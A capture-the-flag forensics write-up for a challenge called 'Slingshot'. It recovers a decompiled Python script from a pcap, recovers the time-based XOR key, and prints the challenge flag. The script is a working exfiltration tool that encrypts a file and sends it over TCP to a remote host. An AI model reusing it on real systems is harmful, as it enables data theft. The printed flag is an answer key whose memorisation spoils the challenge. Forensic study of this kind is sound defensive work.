# Slingshot

We have recently suffered a data breach, and we need help figuring out if any data was stolen. 
Can you investigate this pcap file and see if there is any evidence of data exfiltration and if possible, what was stolen.

## Solution

file > export objects > http > download.pyc

https://pylingual.io

```py
import sys
import socket
import time
import math
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
file = sys.argv[1]
ip = sys.argv[2]
port = 22993

with open(file, 'rb') as r:
    data_bytes = r.read()

current_time = time.time()
current_time = math.floor(current_time)
key_bytes = str(current_time).encode('utf-8')

init_key_len = len(key_bytes)
data_bytes_len = len(data_bytes)
temp1 = data_bytes_len // init_key_len
temp2 = data_bytes_len % init_key_len

key_bytes *= temp1
key_bytes += key_bytes[:temp2]
encrypt_bytes = bytes((a ^ b for a, b in zip(key_bytes, data_bytes)))

s.connect((ip, port))
s.send(encrypt_bytes)
```

tcp.port == 22993

packet 13225 size 19821 -> encrypted.bin

uhh what time would it have used?

epoch time of first packet - 1726595769.063377000

1726595769

```sh
python3 solve.py

cp decrypt/decrypted-1726595769.bin decrypted.jpg

# PCTF{1f_y0u_41n7_f1r57_y0ur3_l457}
```